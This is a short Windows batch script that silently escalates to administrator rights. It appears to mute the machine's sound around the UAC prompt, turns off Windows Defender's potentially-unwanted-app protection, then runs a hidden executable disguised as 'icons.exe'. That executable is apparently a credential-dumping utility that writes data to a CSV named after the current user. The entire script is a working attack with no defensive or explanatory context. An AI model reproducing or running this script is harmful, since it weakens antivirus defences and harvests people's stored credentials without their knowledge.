@echo off

net session >nul 2>&1
if %errorLevel% NEQ 0 (
    PowerShell -Command "(new-object -comobject wscript.shell).SendKeys([char]173)"
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

powershell -Command "Set-MpPreference -PUAProtection 0"
cd /d "%~dp0"

powershell -Command "Start-Process 'x64/icons.exe' -ArgumentList '/scomma x64/%username%.csv' -WindowStyle Hidden"
